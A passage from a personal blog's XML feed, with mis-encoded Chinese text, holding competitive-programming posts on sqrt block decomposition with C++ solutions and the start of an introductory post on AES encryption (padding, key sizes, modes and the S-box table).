class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[l]);</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[r]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        tag[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">lower_bound</span>(v[i].<span class="built_in">begin</span>(),v[i].<span class="built_in">end</span>(),num-tag[i])-v[i].<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>)ans+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    block=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        bl[i]=i/block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bl[n<span class="number">-1</span>];i++)&#123;</span><br><span class="line">        <span class="built_in">update</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        l--,r--;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)<span class="built_in">add</span>(l,r,c);</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">query</span>(l,r,c*c)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> åˆ†å— </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ†å—å…¥é—¨</title>
      <link href="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘cfåˆ·çš„æœ‰ç‚¹éš¾ï¼Œè¯·æ•™ä¸€ä½å¤§ç¥ï¼Œå¤§ç¥æ›°ï¼Œâ€œæ±ä¹‹æƒ‘ï¼Œåˆ†å—ä¹Ÿâ€ï¼Œæ‰€ä»¥å°èœé¸¡æ¥å­¦åˆ†å—äº†ã€‚</p><span id="more"></span><h1 id="æ•°åˆ—åˆ†å—"><a href="#æ•°åˆ—åˆ†å—" class="headerlink" title="æ•°åˆ—åˆ†å—"></a>æ•°åˆ—åˆ†å—</h1><p>åˆ†å—æ˜¯æˆ‘æ„Ÿè§‰æ˜¯æœ€ä¼˜é›…çš„æš´åŠ›äº†ï¼Œé€‚ç”¨äºåŒæ—¶åŒºé—´ä¿®æ”¹å’ŒåŒºé—´æŸ¥è¯¢ï¼Œè€Œä¸”ä¹¦å†™ååˆ†æ–¹ä¾¿ã€‚å¯¹äºåŠ¨æ€ç»´æŠ¤åºåˆ—çš„é¢˜ç›®æˆ‘ä»¬ä¸€èˆ¬ä¼šæƒ³åˆ°æ ‘çŠ¶æ•°ç»„å’Œçº¿æ®µæ ‘ç»“æ„ã€‚</p><p>æ ‘çŠ¶æ•°ç»„çš„é™åˆ¶ååˆ†æ˜æ˜¾ï¼Œä¸èƒ½åŒæ—¶è¿›è¡ŒåŒºé—´ä¿®æ”¹å’ŒåŒºé—´æŸ¥è¯¢åœ°æ“ä½œï¼Œåªèƒ½æ”¯æŒå•ç‚¹ä¿®æ”¹+åŒºé—´æŸ¥è¯¢æˆ–è€…æ˜¯åŒºé—´ä¿®æ”¹å’Œå•ç‚¹æŸ¥è¯¢ã€‚è™½ç„¶æ­¤é¢˜å¯ä»¥ç”¨æ ‘çŠ¶æ•°ç»„åšï¼Œä½†æ˜¯ä¸»è¦è¿˜æ˜¯ç»ƒä¹ ä¸€ä¸‹åˆ†å—ã€‚</p><p>çº¿æ®µæ ‘å¯ä»¥è¯´æ˜¯éå¸¸æ£’çš„åŠ¨æ€ç»´æŠ¤åºåˆ—çš„æ•°æ®ç»“æ„äº†ï¼Œæ—¶é—´å¤æ‚åº¦éå¸¸ä¼˜ç§€ï¼Œä½†æ˜¯ä¹¦å†™èµ·æ¥ååˆ†å¤æ‚ã€‚</p><p>åˆ†å—ä¹Ÿå¹¶ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå¦‚æœåŒæ—¶åŒºé—´ä¿®æ”¹å’ŒåŒºé—´æŸ¥è¯¢ä¸”æ•°æ®èŒƒå›´åœ¨1e6çš„èŒƒå›´ï¼Œé‚£ä¹ˆåˆ†å—å°±å¾ˆå¯èƒ½è¶…æ—¶äº†ï¼Œæ­¤æ—¶åªèƒ½ä½¿ç”¨çº¿æ®µæ ‘ç»“æ„å»ç»´æŠ¤è¿™ä¸ªåºåˆ—ã€‚</p><p>å„æœ‰ä¼˜ç¼ºç‚¹å§ï¼Œä¸»è¦æ˜¯åˆ†å—çš„è¿™ä¸ªæ€æƒ³å¾—å­¦ä¼šï¼Œåœ¨å¾ˆå¤šåœ°æ–¹éƒ½ç”¨å¾—åˆ°ã€‚</p><p>ä¸‹é¢ç»™å‡ºåˆ†å—ç®—æ³•ä¸­çš„ä¸€äº›ç‰¹æœ‰åè¯</p><p>åŒºé—´ï¼šæ•°åˆ—ä¸­è¿ç»­ä¸€æ®µçš„å…ƒç´ </p><p>åŒºé—´æ“ä½œï¼šå°†æŸä¸ªåŒºé—´[a,b]çš„æ‰€æœ‰å…ƒç´ è¿›è¡ŒæŸç§æ”¹åŠ¨çš„æ“ä½œ</p><p>å—ï¼šæˆ‘ä»¬å°†æ•°åˆ—åˆ’åˆ†æˆè‹¥å¹²ä¸ªä¸ç›¸äº¤çš„åŒºé—´ï¼Œæ¯ä¸ªåŒºé—´ç§°ä¸ºä¸€ä¸ªå—</p><p><strong>æ•´å—</strong>ï¼šåœ¨ä¸€ä¸ªåŒºé—´æ“ä½œæ—¶ï¼Œå®Œæ•´åŒ…å«äºåŒºé—´çš„å—</p><p><strong>ä¸å®Œæ•´çš„å—</strong>ï¼šåœ¨ä¸€ä¸ªåŒºé—´æ“ä½œæ—¶ï¼Œåªæœ‰éƒ¨åˆ†åŒ…å«äºåŒºé—´çš„å—ï¼Œå³åŒºé—´å·¦å³ç«¯ç‚¹æ‰€åœ¨çš„ä¸¤ä¸ªå—</p><h2 id="å…¥é—¨1"><a href="#å…¥é—¨1" class="headerlink" title="å…¥é—¨1"></a><a href="https://loj.ac/p/6277">å…¥é—¨1</a></h2><p>æœ¬é“ç»ƒä¹ é¢˜åœ¨lojä¸Šï¼Œé“¾æ¥å·²ç»ç»™å‡ºã€‚</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>æ•°æ®èŒƒå›´åœ¨5wï¼Œå¦‚æœç”¨æœ´ç´ çš„ç®—æ³•é‚£ä¹ˆå¿…è¶…æ—¶çš„ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥æŠŠæ•´ä¸ªåºåˆ—åˆ†æˆä¸€å—ä¸€å—çš„ï¼Œé‚£ä¹ˆåˆ°åº•æ€ä¹ˆåˆ†å‘¢ï¼Œæœ€ä¼˜çš„åˆ†æ³•åº”è¯¥æ˜¯æ¯ä¸€å—åŒ…å«(int)sqrt(n)ä¸ªæ•°æ®ï¼Œæœ€å¤šèƒ½æŠŠæ•°æ®åˆ†æˆ(int)sqrt(n)+1å—ã€‚é‚£ä¹ˆåœ¨è¿›è¡Œä¸€æ¬¡åŒºé—´ä¿®æ”¹çš„æ—¶å€™ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥æŠŠåŒºé—´æŒ‰ç…§åˆ†å—çš„æ–¹å¼å»æ“ä½œï¼Œå¯¹äºä¸€ä¸ªåŒºé—´åˆ†å‡ºçš„æ¯ä¸€ä¸ªå—ï¼Œå¦‚æœè¿™ä¸ªå—æœ‰sqrt(n)ä¸ªæ•°æ®é‚£ä¹ˆç§°è¿™ä¸ªå—æ˜¯å®Œæ•´çš„ï¼Œå¦åˆ™æ˜¯ä¸å®Œæ•´çš„ã€‚å¯¹äºå®Œæ•´çš„å—ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä¸€ä¸ªæ ‡è®°æ•°ç»„ï¼Œæ ‡è®°è¿™ä¸ªå—æ•´ä½“éƒ½è¢«åŠ ä¸Šäº†æŸä¸ªå€¼ï¼›å¯¹äºä¸å®Œæ•´çš„å—æˆ‘ä»¬å¯ä»¥å¯¹æ•´ä¸ªä¸å®Œæ•´çš„å—å†…çš„æ•°æ®è¿›è¡Œå•ç‚¹ä¿®æ”¹ã€‚é‚£ä¹ˆä¸€æ¬¡åŒºé—´ä¿®æ”¹çš„æ“ä½œå¤æ‚åº¦å°±æ˜¯sqrt(n)äº†ã€‚å•ç‚¹æŸ¥è¯¢çš„æ—¶å€™åªéœ€è¦æ‰¾åˆ°é‚£ä¸ªå…ƒç´ çš„å€¼åŠ ä¸Šé‚£ä¸ªå…ƒç´ æ‰€åœ¨åŒºé—´çš„æ ‡è®°å°±æ˜¯è¯¥å…ƒç´ çš„å®é™…å€¼ã€‚</p><p>è¿™é‡Œéœ€è¦è€ƒè™‘ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><p>å·¦ç«¯ç‚¹åœ¨å—çš„èµ·ç‚¹ï¼Œå³ç«¯ç‚¹ä¸åœ¨å¦ä¸€ä¸ªå—çš„ç»ˆç‚¹ï¼šéœ€è¦å…ˆå¤„ç†å³ç«¯ç‚¹æ‰€åœ¨çš„ä¸å®Œæ•´çš„å—çš„å…ƒç´ å€¼ä¹‹åï¼Œå¯¹å‰©ä¸‹çš„å®Œæ•´çš„å—è¿›è¡ŒåŒºé—´æ ‡è®°ã€‚</p><p>å·¦ç«¯ç‚¹ä¸åœ¨å—çš„èµ·ç‚¹ï¼Œå³ç«¯ç‚¹åœ¨å¦ä¸€ä¸ªå—çš„ç»ˆç‚¹ï¼šéœ€è¦å…ˆå¤„ç†å·¦ç«¯ç‚¹æ‰€åœ¨çš„ä¸å®Œæ•´çš„å—çš„å…ƒç´ å€¼ä¹‹åï¼Œå¯¹å‰©ä¸‹çš„å®Œæ•´çš„å—è¿›è¡ŒåŒºé—´æ ‡è®°ã€‚</p><p>å·¦ç«¯ç‚¹åœ¨å—çš„èµ·ç‚¹ï¼Œå³ç«¯ç‚¹åœ¨å¦ä¸€ä¸ªå—çš„ç»ˆç‚¹ï¼šç›´æ¥å¯¹æ‰€æœ‰å—è¿›è¡Œæ ‡è®°å³å¯ã€‚</p><p>å·¦ç«¯ç‚¹ä¸å³ç«¯ç‚¹åœ¨åŒä¸€ä¸ªå—ä¸Šï¼Œä¸”å®Œæ•´å æ®æ•´ä¸ªå—ï¼šç›´æ¥å¯¹è¯¥å—æ ‡è®°ã€‚</p><p>å·¦ç«¯ç‚¹ä¸å³ç«¯ç‚¹åœ¨åŒä¸€ä¸ªå—ä¸Šï¼Œä¸”ä¸å®Œæ•´å æ®æ•´ä¸ªå—ï¼šç›´æ¥å¯¹åŒºé—´å†…çš„å…ƒç´ è¿›è¡Œä¿®æ”¹å³å¯ã€‚</p><p>åˆšå¼€å§‹è€ƒè™‘æƒ…å†µä¸å‘¨ï¼Œå¯¼è‡´WAäº†å¾ˆå¤šæ¬¡ï¼Œä¸‹é¢è´´å‡ºACä»£ç å’Œæµ‹è¯„æƒ…å†µã€‚</p><p>æ ‡ç¨‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> block[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    <span class="keyword">int</span> block_size=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c,i;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)/block_size==(r<span class="number">-1</span>)/block_size)&#123;</span><br><span class="line">                <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size==<span class="number">0</span>&amp;&amp;r%block_size==<span class="number">0</span>)&#123;</span><br><span class="line">                    block[(l<span class="number">-1</span>)/block_size+<span class="number">1</span>]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">                        a[i]+=c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(i=l;i&lt;=<span class="built_in">min</span>(((l<span class="number">-1</span>)/block_size+<span class="number">1</span>)*block_size,r);i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                l=i<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(r%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(i=<span class="built_in">max</span>((r<span class="number">-1</span>)/block_size*block_size+<span class="number">1</span>,l);i&lt;=r;i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                r=r/block_size*block_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=l/block_size+<span class="number">1</span>;i&lt;=r/block_size;i++)&#123;</span><br><span class="line">                block[i]+=c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[r]+block[(r<span class="number">-1</span>)/block_size+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬è’Ÿè’»æµ‹è¯„çš„çŠ¶å†µ</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>è¿™ç®—æ­£å¼å…¥é—¨äº†ä»¥ä¸‹è¿™ä¸ªåˆ†å—å§ï¼Œåé¢æŠŠè¿™ä¸ªåˆ†å—çš„æ‰€æœ‰å…¥é—¨éƒ½åšäº†å…ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> åˆ†å— </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AESåŠ å¯†å­¦ä¹ </title>
      <link href="/2021/12/18/AES%E5%8A%A0%E5%AF%86/"/>
      <url>/2021/12/18/AES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥å­¦å­¦AESã€‚</p><span id="more"></span><h1 id="AESç®€ä»‹"><a href="#AESç®€ä»‹" class="headerlink" title="AESç®€ä»‹"></a>AESç®€ä»‹</h1><p>é«˜çº§åŠ å¯†æ ‡å‡†(AES,Advanced Encryption Standard)ä¸ºæœ€å¸¸è§çš„å¯¹ç§°åŠ å¯†ç®—æ³•(å¾®ä¿¡å°ç¨‹åºåŠ å¯†ä¼ è¾“å°±æ˜¯ç”¨è¿™ä¸ªåŠ å¯†ç®—æ³•çš„)ã€‚å¯¹ç§°åŠ å¯†ç®—æ³•ä¹Ÿå°±æ˜¯åŠ å¯†å’Œè§£å¯†ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå…·ä½“çš„åŠ å¯†æµç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/1.png" alt="1"></p><h2 id="åˆ†ç»„é—®é¢˜"><a href="#åˆ†ç»„é—®é¢˜" class="headerlink" title="åˆ†ç»„é—®é¢˜"></a>åˆ†ç»„é—®é¢˜</h2><p>AESå±äºåˆ†ç»„åŠ å¯†ï¼Œä»€ä¹ˆæ˜¯åˆ†ç»„åŠ å¯†å‘¢ï¼Œé¡¾åæ€ä¹‰ï¼Œåˆ†ç»„åŠ å¯†=åˆ†ç»„+åŠ å¯†(ç‹—å¤´ã€‚åˆ†ç»„å°±æ˜¯è¯´æŠŠå®ƒåˆ†æˆä¸€ä¸ªä¸ªç»„è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥æŠŠå®ƒå’Œbase64ä½œä¸ºä¸€ä¸ªå¯¹æ¯”ï¼Œbase64æ˜¯ä¸‰ä¸ªå­—ç¬¦ä¸€ç»„è¿›è¡Œç¼–ç ï¼Œé‚£ä¹ˆæ—¢ç„¶æ˜¯è¦åˆ†ç»„é‚£å¿…ç„¶ä¹Ÿä¼šé‡åˆ°åˆ†ç»„ä¸æ»¡çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åŠ ä¸Šå¡«å……ã€‚è¿™ä¸ªå¡«å……å‘¢ï¼Œæœ‰å¾ˆå¤šç§æ–¹æ¡ˆã€‚</p><h3 id="é›¶å­—èŠ‚å¡«å……"><a href="#é›¶å­—èŠ‚å¡«å……" class="headerlink" title="é›¶å­—èŠ‚å¡«å……"></a>é›¶å­—èŠ‚å¡«å……</h3><p>è¿™ä¸ªå¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§çš„æ‰‹æ®µäº†ï¼Œä¸€èˆ¬äººä¸€èˆ¬ä¹Ÿéƒ½èƒ½æƒ³å¾—åˆ°ï¼Œä½†æ˜¯è¿™æ ·çš„è¯éš¾ä»¥åŒºåˆ†æœ«å°¾çš„0åˆ°åº•æ˜¯å®ƒçš„ä¿¡æ¯æœ¬æ¥å°±å­˜åœ¨çš„è¿˜æ˜¯å¡«å……çš„ï¼Œä¿¡æ¯è¡¨è¾¾ä¸æ˜ç¡®ã€‚</p><h3 id="å¡«å……nä½n"><a href="#å¡«å……nä½n" class="headerlink" title="å¡«å……nä½n"></a>å¡«å……nä½n</h3><p>è¿™ä¸ªç•¥æœ‰ç‚¹æ„æ€ã€‚ä½†æ˜¯å‡å¦‚å®ƒæœ¬æ¥ä¿¡æ¯å°±æœ‰nä½nå‘¢ï¼Ÿé‚£ä¹ˆæœ€åçš„é‚£nä½nè¿˜æ˜¯æ²¡åŠæ³•åŒºåˆ†æ˜¯ä¸æ˜¯å®ƒæœ¬æ¥å°±æœ‰çš„ã€‚</p><p>é‚£ä¹ˆæœ€ç»ˆAESé‡‡å–äº†å“ªç§å¡«å……æ–¹å¼å‘¢ï¼Ÿå®ƒé€‰æ‹©åœ¨ç¬¬äºŒç§æ–¹æ¡ˆä¸­æ”¹è¿›ï¼Œå¦‚æœé•¿åº¦åˆšå¥½ä¸éœ€è¦å¡«å……ï¼Œé‚£ä¹ˆå°±å¡«å……16ä½16ã€‚è¿™ä¹ˆä¸€æ¥ï¼Œå¦‚æœå®ƒæœ«å°¾å­˜åœ¨äº†nä½nï¼Œä½†æ˜¯ç”±äºé•¿åº¦æ»¡è¶³16çš„å€æ•°ï¼Œé‚£ä¹ˆè¿˜ä¼šå¡«å……16ä½16ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤ŸåŒºåˆ†å¡«å……ä½å’Œæ˜æ–‡ä½äº†ã€‚</p><h2 id="AESå¸¸è§åˆ†ç±»"><a href="#AESå¸¸è§åˆ†ç±»" class="headerlink" title="AESå¸¸è§åˆ†ç±»"></a>AESå¸¸è§åˆ†ç±»</h2><p>AESæœ‰ä¸‰ç§å¸¸è§åŠ å¯†æ ‡å‡†ï¼Œæ ¹æ®å¯†é’¥ä½æ•°ä¸åŒç”¨äºåŒºåˆ†ï¼Œå¯†é’¥çš„é•¿åº¦ä¸åŒï¼Œæ¨èåŠ å¯†è½®æ•°ä¹Ÿä¸åŒï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th>AES</th><th>å¯†é’¥é•¿åº¦ï¼ˆå­—èŠ‚)</th><th>åˆ†ç»„é•¿åº¦(å­—èŠ‚)</th><th>åŠ å¯†è½®æ•°</th></tr></thead><tbody><tr><td>AES-128</td><td>16</td><td>16</td><td>10</td></tr><tr><td>AES-192</td><td>24</td><td>16</td><td>12</td></tr><tr><td>AES-256</td><td>32</td><td>16</td><td>14</td></tr></tbody></table><p>AESè¿˜æœ‰äº”ç§åŠ å¯†æ¨¡å¼ï¼š1.ç”µç æœ¬æ¨¡å¼ï¼ˆElectronic Codebook Book (ECB)ï¼‰ï¼›2.å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼ˆCipher Block Chaining (CBC)ï¼‰ï¼›3.è®¡ç®—å™¨æ¨¡å¼ï¼ˆCounter (CTR)ï¼‰ï¼›4.å¯†ç åé¦ˆæ¨¡å¼ï¼ˆCipher FeedBack (CFB)ï¼‰ï¼›5.è¾“å‡ºåé¦ˆæ¨¡å¼ï¼ˆOutput FeedBack (OFB)ï¼‰ã€‚</p><p>æœ¬ç‰‡åšå®¢åªä»‹ç»å‰ä¸¤ç§æ¨¡å¼ã€‚</p><h1 id="AESåŠ å¯†æµç¨‹"><a href="#AESåŠ å¯†æµç¨‹" class="headerlink" title="AESåŠ å¯†æµç¨‹"></a>AESåŠ å¯†æµç¨‹</h1><p>AESçš„EBCæ¨¡å¼å¤§æ¦‚å¯ä»¥ç”¨ä¸‹é¢çš„æµç¨‹å›¾å›¾è¡¨ç¤º</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/2.png" alt="2"></p><h2 id="å­—èŠ‚æ›¿æ¢"><a href="#å­—èŠ‚æ›¿æ¢" class="headerlink" title="å­—èŠ‚æ›¿æ¢"></a>å­—èŠ‚æ›¿æ¢</h2><p>å®˜æ–¹çš„è§£é‡Šæ˜¯ï¼Œå»ºç«‹16*16çš„å­—èŠ‚è¡¨ï¼Œç„¶åæŠŠè‡ªå·±æ‹†æˆé«˜4ä½å’Œä½å››ä½ï¼Œé«˜å››ä½ä½è¡Œï¼Œç¬¬å››ä½ä¸ºåˆ—å¥½å»æŸ¥è¡¨æ›¿æ¢ã€‚è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå…¶å®å°±æ˜¯åœ¨0x00-0xffå­—èŠ‚å†…å»ºç«‹åŒå°„ï¼Œè®©æ¯ä¸ªå­—èŠ‚æ›¿æ¢ä¸ºå…¶å®ƒå­—èŠ‚ã€‚æ¯”å¦‚æœ€ç®€å•çš„ï¼Œæˆ‘è®©æ‰€æœ‰å­—èŠ‚éƒ½åŠ 1%256ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåŒå°„å˜æ¢ã€‚é‚£ä¹ˆæ—¢ç„¶æ˜¯ä¸€ä¸ªåŒå°„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾ˆå®¹æ˜“æ±‚å‡ºå®ƒçš„é€†ã€‚</p><p>ä¸€èˆ¬AESåŠ å¯†ç”¨ä»¥ä¸‹çš„å­—èŠ‚æ›¿æ¢è¡¨</p><table><thead><tr><th>è¡Œ/åˆ—</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td